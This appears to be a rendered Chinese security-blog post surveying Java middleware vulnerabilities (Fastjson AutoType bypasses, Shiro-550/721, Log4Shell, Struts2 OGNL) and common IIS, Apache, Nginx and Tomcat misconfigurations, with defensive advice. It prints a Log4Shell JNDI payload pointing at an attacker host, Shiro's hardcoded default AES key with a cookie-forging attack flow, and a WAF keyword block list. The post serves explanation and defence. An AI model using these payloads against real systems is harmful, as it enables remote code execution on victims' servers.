@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Enil ">
+<meta name="description" content="Fastjson Fastjson 是阿里巴巴开源的一款高性能 Java JSON 处理库，用于在 Java 对象与 JSON 字符串之间进行序列化与反序列化。由于其极快的解析速度，它被广泛应用与国内大量 Java Web 应用和微服务架构中，尤其在企业级系统中极为普遍。
+AutoType Fastjson 最大的特色也是其最大的安全隐患 &ndash; AutoType 机制。它允许 JSON 数据中通过 @type 字段指定反序列化的目标类。
+{ &#34;@type&#34;: &#34;com.example.User&#34;, &#34;name&#34;: &#34;Enil&#34;, &#34;age&#34;: 21 } Fastjson 解析时会根据 @type 的值动态加载对应的 Java 类并实例化，这在功能上提供了多态支持，但也给攻击者提供了加载任意恶意类的入口。
+漏洞历史 版本 漏洞类型 核心原理 ≤ 1.2.24 RCE（CVE-2017-18349） AutoType 无限制，可直接加载 JdbcRowSetImpl 触发 JNDI 注入 ≤ 1.2.41 黑名单绕过 类名前加 L、末尾加 ; 绕过前缀检测 ≤ 1.2.42 双写绕过 使用 LL...;; 双层嵌套绕过二次修复 ≤ 1.2.47 缓存逻辑漏洞 利用 java.lang.Class 将黑名单类预加载进 mappings 缓存，绕过 autoType 检查 ≤ 1.2.68 expectClass 绕过 通过 Runnable/Readable 等期望类触发 checkAutoType 的另一条路径 ≤ 1.2.80 异常类链绕过 利用异常类（Exception 子类）作为期望类绕过 1.2.68 的修复 防御建议 升级至最新版本 开启 safeMode，ParserConfig.getGlobalInstancce().setSafeMode(true)。完全禁用 AutoType 关闭 AutoType WAF 规则，过滤关键词 @type、JNDI、ldap://、rmi:// 等关键字流量 Apache Shiro Apache Shiro 是一个轻量级 Java 安全框架，提供认证、授权、加密、会话管理，可同时运用于 JavaSE 和 JavaEE 环境。
+" />
+<meta name="keywords" content=", Hack" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/posts/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E/" />
+
+
+    <title>
+        
+            中间件及其漏洞 :: Welcome My Hack&#39;s Blog 
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="/main.min.ab5336003ba331300318b49292c672210905baf1ef5410a739f647e70c8808fa.css" integrity="sha256-q1M2ADujMTADGLSSksZyIQkFuvHvVBCnOfZH5wyICPo=" crossorigin="anonymous">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="中间件及其漏洞">
+  <meta itemprop="description" content="Fastjson Fastjson 是阿里巴巴开源的一款高性能 Java JSON 处理库，用于在 Java 对象与 JSON 字符串之间进行序列化与反序列化。由于其极快的解析速度，它被广泛应用与国内大量 Java Web 应用和微服务架构中，尤其在企业级系统中极为普遍。
+AutoType Fastjson 最大的特色也是其最大的安全隐患 – AutoType 机制。它允许 JSON 数据中通过 @type 字段指定反序列化的目标类。
+{ &#34;@type&#34;: &#34;com.example.User&#34;, &#34;name&#34;: &#34;Enil&#34;, &#34;age&#34;: 21 } Fastjson 解析时会根据 @type 的值动态加载对应的 Java 类并实例化，这在功能上提供了多态支持，但也给攻击者提供了加载任意恶意类的入口。
+漏洞历史 版本 漏洞类型 核心原理 ≤ 1.2.24 RCE（CVE-2017-18349） AutoType 无限制，可直接加载 JdbcRowSetImpl 触发 JNDI 注入 ≤ 1.2.41 黑名单绕过 类名前加 L、末尾加 ; 绕过前缀检测 ≤ 1.2.42 双写绕过 使用 LL...;; 双层嵌套绕过二次修复 ≤ 1.2.47 缓存逻辑漏洞 利用 java.lang.Class 将黑名单类预加载进 mappings 缓存，绕过 autoType 检查 ≤ 1.2.68 expectClass 绕过 通过 Runnable/Readable 等期望类触发 checkAutoType 的另一条路径 ≤ 1.2.80 异常类链绕过 利用异常类（Exception 子类）作为期望类绕过 1.2.68 的修复 防御建议 升级至最新版本 开启 safeMode，ParserConfig.getGlobalInstancce().setSafeMode(true)。完全禁用 AutoType 关闭 AutoType WAF 规则，过滤关键词 @type、JNDI、ldap://、rmi:// 等关键字流量 Apache Shiro Apache Shiro 是一个轻量级 Java 安全框架，提供认证、授权、加密、会话管理，可同时运用于 JavaSE 和 JavaEE 环境。">
+  <meta itemprop="datePublished" content="2026-06-30T16:00:00+08:00">
+  <meta itemprop="dateModified" content="2026-06-30T16:00:00+08:00">
+  <meta itemprop="wordCount" content="437">
+  <meta itemprop="keywords" content="Hack">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="中间件及其漏洞">
+  <meta name="twitter:description" content="Fastjson Fastjson 是阿里巴巴开源的一款高性能 Java JSON 处理库，用于在 Java 对象与 JSON 字符串之间进行序列化与反序列化。由于其极快的解析速度，它被广泛应用与国内大量 Java Web 应用和微服务架构中，尤其在企业级系统中极为普遍。
+AutoType Fastjson 最大的特色也是其最大的安全隐患 – AutoType 机制。它允许 JSON 数据中通过 @type 字段指定反序列化的目标类。
+{ &#34;@type&#34;: &#34;com.example.User&#34;, &#34;name&#34;: &#34;Enil&#34;, &#34;age&#34;: 21 } Fastjson 解析时会根据 @type 的值动态加载对应的 Java 类并实例化，这在功能上提供了多态支持，但也给攻击者提供了加载任意恶意类的入口。
+漏洞历史 版本 漏洞类型 核心原理 ≤ 1.2.24 RCE（CVE-2017-18349） AutoType 无限制，可直接加载 JdbcRowSetImpl 触发 JNDI 注入 ≤ 1.2.41 黑名单绕过 类名前加 L、末尾加 ; 绕过前缀检测 ≤ 1.2.42 双写绕过 使用 LL...;; 双层嵌套绕过二次修复 ≤ 1.2.47 缓存逻辑漏洞 利用 java.lang.Class 将黑名单类预加载进 mappings 缓存，绕过 autoType 检查 ≤ 1.2.68 expectClass 绕过 通过 Runnable/Readable 等期望类触发 checkAutoType 的另一条路径 ≤ 1.2.80 异常类链绕过 利用异常类（Exception 子类）作为期望类绕过 1.2.68 的修复 防御建议 升级至最新版本 开启 safeMode，ParserConfig.getGlobalInstancce().setSafeMode(true)。完全禁用 AutoType 关闭 AutoType WAF 规则，过滤关键词 @type、JNDI、ldap://、rmi:// 等关键字流量 Apache Shiro Apache Shiro 是一个轻量级 Java 安全框架，提供认证、授权、加密、会话管理，可同时运用于 JavaSE 和 JavaEE 环境。">
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2026-06-30 16:00:00 &#43;0800 CST" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/english-articles/">English Articles</a></li><li><a href="/long-articles/">长文章</a></li><li><a href="/posts/">文章</a></li><li><a href="/tags/">标签</a></li><li><a href="/tools/">工具专区</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        3 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="http://localhost:1313/posts/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E/">中间件及其漏洞</a>
+      </h1>
+
+      
+
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table of Contents</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#fastjson">Fastjson</a>
+      <ul>
+        <li><a href="#autotype">AutoType</a></li>
+        <li><a href="#漏洞历史">漏洞历史</a></li>
+        <li><a href="#防御建议">防御建议</a></li>
+      </ul>
+    </li>
+    <li><a href="#apache-shiro">Apache Shiro</a>
+      <ul>
+        <li><a href="#核心架构">核心架构</a></li>
+        <li><a href="#两大核心漏洞">两大核心漏洞</a></li>
+      </ul>
+    </li>
+    <li><a href="#log4j">Log4j</a>
+      <ul>
+        <li><a href="#lookup-插件">Lookup 插件</a></li>
+        <li><a href="#log4shellcve-2021-44228">Log4Shell（CVE-2021-44228）</a></li>
+      </ul>
+    </li>
+    <li><a href="#struts2">Struts2</a>
+      <ul>
+        <li><a href="#漏洞类型">漏洞类型</a></li>
+      </ul>
+    </li>
+    <li><a href="#iis">IIS</a>
+      <ul>
+        <li><a href="#常见的隐患">常见的隐患</a></li>
+      </ul>
+    </li>
+    <li><a href="#apache">Apache</a>
+      <ul>
+        <li><a href="#常见的安全隐患">常见的安全隐患</a></li>
+      </ul>
+    </li>
+    <li><a href="#nginx">Nginx</a>
+      <ul>
+        <li><a href="#常见安全-隐患">常见安全 隐患</a></li>
+      </ul>
+    </li>
+    <li><a href="#tomcat">Tomcat</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        <h2 id="fastjson">Fastjson</h2>
+<p>Fastjson 是阿里巴巴开源的一款高性能 Java JSON 处理库，用于在 Java 对象与 JSON 字符串之间进行序列化与反序列化。由于其极快的解析速度，它被广泛应用与国内大量 Java Web 应用和微服务架构中，尤其在企业级系统中极为普遍。</p>
+<h3 id="autotype">AutoType</h3>
+<p>Fastjson 最大的特色也是其最大的安全隐患 &ndash; AutoType 机制。它允许 JSON 数据中通过 <code>@type</code> 字段指定反序列化的目标类。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;@type&#34;</span>: <span style="color:#e6db74">&#34;com.example.User&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Enil&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;age&#34;</span>: <span style="color:#ae81ff">21</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Fastjson 解析时会根据 <code>@type</code> 的值动态加载对应的 Java 类并实例化，这在功能上提供了多态支持，但也给攻击者提供了加载任意恶意类的入口。</p>
+<h3 id="漏洞历史">漏洞历史</h3>
+<table>
+  <thead>
+      <tr>
+          <th>版本</th>
+          <th>漏洞类型</th>
+          <th>核心原理</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>≤ 1.2.24</td>
+          <td>RCE（CVE-2017-18349）</td>
+          <td>AutoType 无限制，可直接加载 <code>JdbcRowSetImpl</code> 触发 JNDI 注入</td>
+      </tr>
+      <tr>
+          <td>≤ 1.2.41</td>
+          <td>黑名单绕过</td>
+          <td>类名前加 <code>L</code>、末尾加 <code>;</code> 绕过前缀检测</td>
+      </tr>
+      <tr>
+          <td>≤ 1.2.42</td>
+          <td>双写绕过</td>
+          <td>使用 <code>LL...;;</code> 双层嵌套绕过二次修复</td>
+      </tr>
+      <tr>
+          <td>≤ 1.2.47</td>
+          <td>缓存逻辑漏洞</td>
+          <td>利用 <code>java.lang.Class</code> 将黑名单类预加载进 <code>mappings</code> 缓存，绕过 autoType 检查</td>
+      </tr>
+      <tr>
+          <td>≤ 1.2.68</td>
+          <td>expectClass 绕过</td>
+          <td>通过 <code>Runnable</code>/<code>Readable</code> 等期望类触发 <code>checkAutoType</code> 的另一条路径</td>
+      </tr>
+      <tr>
+          <td>≤ 1.2.80</td>
+          <td>异常类链绕过</td>
+          <td>利用异常类（Exception 子类）作为期望类绕过 1.2.68 的修复</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="防御建议">防御建议</h3>
+<ul>
+<li>升级至最新版本</li>
+<li>开启 safeMode，<code>ParserConfig.getGlobalInstancce().setSafeMode(true)</code>。完全禁用 AutoType</li>
+<li>关闭 AutoType</li>
+<li>WAF 规则，过滤关键词 <code>@type</code>、<code>JNDI</code>、<code>ldap://</code>、<code>rmi://</code> 等关键字流量</li>
+</ul>
+<h2 id="apache-shiro">Apache Shiro</h2>
+<p>Apache Shiro 是一个轻量级 Java 安全框架，提供认证、授权、加密、会话管理，可同时运用于 JavaSE 和 JavaEE 环境。</p>
+<h3 id="核心架构">核心架构</h3>
+<ul>
+<li>Subject：当前与系统交互的用户，可以是人或程序</li>
+<li>SecurityManager：Shiro 的核心，协调所有组件运作，相当于总控制器</li>
+<li>Realm：Shiro 与应用数据之间的桥梁，开发者自定义实现</li>
+<li>Authenticator：负责验证用户身份</li>
+<li>Authorizer：负责权限判断，决定用户是否可以执行某操作</li>
+<li>SessionManager：管理用户会话，无需依赖 HTTP Session</li>
+<li>CookieRemenberMeManager：实现 “记住我” 的 Cookie 加解密</li>
+</ul>
+<h3 id="两大核心漏洞">两大核心漏洞</h3>
+<h4 id="shiro-550cve-2016-4437">Shiro-550（CVE-2016-4437）</h4>
+<p>Shiro 历史上最经典、影响最广的漏洞，影响版本≤1.2.4。</p>
+<p>原理是利用 Shiro 的 &ldquo;记住我&rdquo; 功能将用户信息序列化后，用 AES 加密再 Base64 编码存入 <code>rememberMe</code> Cookie。服务端收到请求时执行逆向流程：</p>
+<p><code>Base64 编码 -&gt; AES 解密 -&gt; 反序列化</code></p>
+<p>AES 密钥是硬编码再源码中的固定值 <code>kPH+bIxk5D2deZiIxcaaaA==</code>，攻击者可以用该密钥加密恶意序列化 Payload，服务端反序列化时触发 RCE。</p>
+<p>攻击流程如下：</p>
+<ol>
+<li>用 <code>ysoserial</code> 生成恶意 Java 序列化 Payload</li>
+<li>用已知的硬编码 AES 密钥对 Payload 加密并 Base64 编码</li>
+<li>将结果作为 <code>rememberMe</code> Cookie 发送给服务器</li>
+<li>服务器反序列化 Payload，触发 RCE</li>
+</ol>
+<h4 id="shiro-721cve-2019-12422">Shiro-721（CVE-2019-12422）</h4>
+<p><strong>影响版本 &lt; 1.4.2</strong>，是对 Shiro-550 修复方案的进一步突破 。</p>
+<p>Shiro 使用 AES-1288-CBC 模式加密，该模式存在经典漏洞 Padding Oracle。攻击者无需知道密钥，反复发送篡改后的 Cookie，观察服务器返回 500 错误还是 200 OK，逐字节推算出加密数据，最终构造出合法的恶意 Cookie，实现反序列化攻击。</p>
+<h2 id="log4j">Log4j</h2>
+<p>Apache Log4j 是 Java 生态中最广泛使用的开源日志记录框架，几乎所有 Java 应用都会通过它记录程序运行日志。正因其极高的普及率，2021 年 12 月爆出的 Log4j2 漏洞被认为是自 Hearbleed 和 ShellShock 以来互联网上最严重的漏洞之一。</p>
+<h3 id="lookup-插件">Lookup 插件</h3>
+<p>Log4j2 提供了一套强大的 Lookups 机制，允许在日志内容中动态解析特定语法，例如：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">${</span>java:version<span style="color:#e6db74">}</span>              -&gt; 输出当前 Java 版本
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">${</span>env:PATH<span style="color:#e6db74">}</span>                  -&gt; 输出环境变量
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">${</span>jndi:ldap://example.com/a<span style="color:#e6db74">}</span> -&gt; 通过 JNDI 远程查找对象
+</span></span></code></pre></div><p>Log4j2 在记录日志时会对 <code>${}</code> 格式的字符串进行递归解析，而这个设计本身没有对协议和来源做任何限制。</p>
+<h3 id="log4shellcve-2021-44228">Log4Shell（CVE-2021-44228）</h3>
+<p><strong>影响版本</strong>：Log4j 2.0-beta9 ~ 2.14.1，无需身份认证，利用难度极低 。</p>
+<p>2013 年 Log4j 2.0-beta9 引入的 JndiLookup 插件允许 JNDI（Java 命名和目录接口）远程加载 Java 对象，支持 LDAP、RMI、DNS 等多种协议。</p>
+<p>当应用程序将用户可控的输入记录到日志时（如 HTTP 请求头、用户名、搜索关键词），攻击者只需传入如下 Payload：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">${</span>jndi:ldap://attacker.com/exploit<span style="color:#e6db74">}</span>
+</span></span></code></pre></div><p>Log4j 解析日志内容时会主动发起 LDAP 请求到攻击者服务器，攻击者的 LDAP 服务器返回一个恶意 Java 类的引用，受害服务器下载并实例化该类，触发 RCE。</p>
+<h2 id="struts2">Struts2</h2>
+<p>Strurs 的一次请求理解如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>浏览器请求 -&gt; Struts前端过滤器 -&gt; ActionMapper根据URL定位Action -&gt; ActionInvocation按顺序执行拦截器找 -&gt; 参数绑定/类型转换/校验/权限等 -&gt; 执行Action业务逻辑 -&gt; 返回Result -&gt; JSP/FreeMarker等视图渲染响应
+</span></span></code></pre></div><ul>
+<li>Action：类控制器，接收请求、调用业务逻辑返回结果</li>
+<li>Interceptor：类责任链，参数绑定、校验、文件上传、异常处理等都可在 Action 前后执行</li>
+<li>ValueStack：请求处理期间存放 Action、模型对象、上下文数据的对象栈</li>
+<li>OGNL：访问和操作 ValueStack 中对象的表达式语言，视图和参数绑定都会涉及它</li>
+</ul>
+<p>例如参数拦截器会把请求参数写入 ValueStack，官方文档明确指出，参数名本质上会按 OGNL 表达式处理，因此必须限制可接受的参数名和数值。</p>
+<p>攻击者输入被框架或业务代码当成 OGNL 表达式再次解析和执行。</p>
+<p>OGNL 能访问对象属性；如果攻击者能影响表达式执行上下文，进一步接触到 <code>ActionContext</code>、请求、会话应用对象等，就可能从表达式注入升级为严重的代码执行风险。Apache 官方也指出，Struts 的历史高危漏洞中有不少与 OGNL 的强大表达能力有关。</p>
+<h3 id="漏洞类型">漏洞类型</h3>
+<ol>
+<li>OGNL 注入/二次解析</li>
+</ol>
+<p>开发者把用户输入直接拼接进标签属性、错误信息、跳转结果或表达式，再让框架执行。</p>
+<p>风险链路通常是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>用户可控输入 -&gt; 被当成OGNL语句 -&gt; 访问对象或上下文 -&gt; 权限扩大 -&gt; 可能导致 RCE
+</span></span></code></pre></div><ol start="2">
+<li>文件上传</li>
+<li>XXE</li>
+<li>参数绑定与越权修改</li>
+</ol>
+<h2 id="iis">IIS</h2>
+<p>IIS 常担任反向代理、TLS 终止、认证、请求过滤和 ASP.NET 应用托管等 “中间层” 职责。</p>
+<p>一次 IIS 的工作请求如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>客户端 -&gt; HTTP.sys（内核态监听、连接与请求队列） -&gt; WAS/应用程序池 -&gt; w3wp.exe工作进程 -&gt; IIS模块、Handler Mapping -&gt; ASP.NET/PHP/静态文件等应用
+</span></span></code></pre></div><p>IIS 会把请求交给对应应用程序池的工作进程处理；应用程序池可独立身份运行，因此能做站点隔离。</p>
+<h3 id="常见的隐患">常见的隐患</h3>
+<ol>
+<li>版本过旧</li>
+<li>目录浏览导致敏感文件泄露</li>
+<li>请求过滤不足：路径穿越、双重编码、危险扩展名</li>
+<li>WebDAV 配置不当</li>
+<li>应用程序池权限过高</li>
+<li>Handler Mapping、ISAPI、CGI、FastCGI 配置不当</li>
+<li>认证与授权错误</li>
+<li>详细报错与版本泄露</li>
+<li>TLS、HTTP 安全响应头配置弱</li>
+<li>上传功能与 Web 根目录混放</li>
+</ol>
+<h2 id="apache">Apache</h2>
+<p>Apache 的风险不仅取决于 <code>httpd</code> 主程序，也取决于是否启用了 <code>mod_http2</code>、<code>mod_proxy</code>、<code>mod_rewrite</code>、<code>mod_lua</code>、<code>mod_dav</code>、<code>mod_ssl</code> 等模块。</p>
+<h3 id="常见的安全隐患">常见的安全隐患</h3>
+<ol>
+<li>版本与模块漏洞</li>
+<li>配置错误导致任意文件或敏感文件泄露</li>
+<li>目录列表与目录遍历</li>
+<li><code>.htaccess</code> 权限过宽</li>
+<li>CGI、PHP、Perl、Python 等动态脚本执行风险</li>
+<li>反向代理、开放代理和 SSRF 风险</li>
+<li><code>mod_rewrite</code> 规则导致绕过、SSRF 或路径问题</li>
+<li>管理界面和状态信息泄露</li>
+<li>TLS、证书和安全响应头配置不足</li>
+<li>权限、日志和运行账户配置不当</li>
+</ol>
+<h2 id="nginx">Nginx</h2>
+<h3 id="常见安全-隐患">常见安全 隐患</h3>
+<p>Nginx 是 Web 服务器、反向代理、负载均衡和缓存组件。本身新能很高，但是在真实的项目中，风险往往来自 “反向代理配置、静态文件映射、信任边界和权限设计”。</p>
+<ol>
+<li>版本与模块漏洞</li>
+<li><code>root</code>、<code>alias</code>、<code>location</code> 配置错误导致文件泄露</li>
+<li>目录列表和符号链接泄露</li>
+<li>反向代理信任边界错误</li>
+<li>动态 <code>proxy_pass</code> 引发 SSRF 或开放代理</li>
+<li>上传目录可执行，形成 WebShell 风险</li>
+<li>拒绝服务</li>
+<li>TLS 与安全响应头配置不足</li>
+<li>缓存配置不当导致越权或隐私泄露</li>
+<li>管理与状态页面暴露</li>
+</ol>
+<h2 id="tomcat">Tomcat</h2>
+<ol>
+<li>版本过旧与协议类漏洞</li>
+<li>Manager/Host Manager 管理后台暴露</li>
+<li>AJP 连接器暴露</li>
+<li>自动部署与可写 <code>webapps</code> 目录</li>
+<li>Tomcat 运行权限过高</li>
+<li>DefaultServlet 或上传配置不当</li>
+<li>Realm、弱口令、暴力破解</li>
+<li>JMX 远程管理接口暴露</li>
+<li>错误页、版本号和调试信息泄露</li>
+<li>反向代理、路径解析与请求走私</li>
+</ol>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="http://localhost:1313/tags/hack/">Hack</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        437 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2026-06-30 16:00
+        
+
+         
+          
+        
+      </p>
+    </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="http://localhost:1313/posts/htb-reel-writeup/">
+                    <span class="button__text">HTB-Reel Writeup</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.ad54ad97364f77ede35def9096b162bb1f0b3973aa50b080f5e82fa147f6882e2a7200d7535adbf9b51bebf939f1c1ca9bbe6be87530092aca720eac4a226fda.js" integrity="sha512-rVStlzZPd&#43;3jXe&#43;QlrFiux8LOXOqULCA9egvoUf2iC4qcgDXU1rb&#43;bUb6/k58cHKm75r6HUwCSrKcg6sSiJv2g=="></script>
+
+
+
+
+    </body>
+</html>
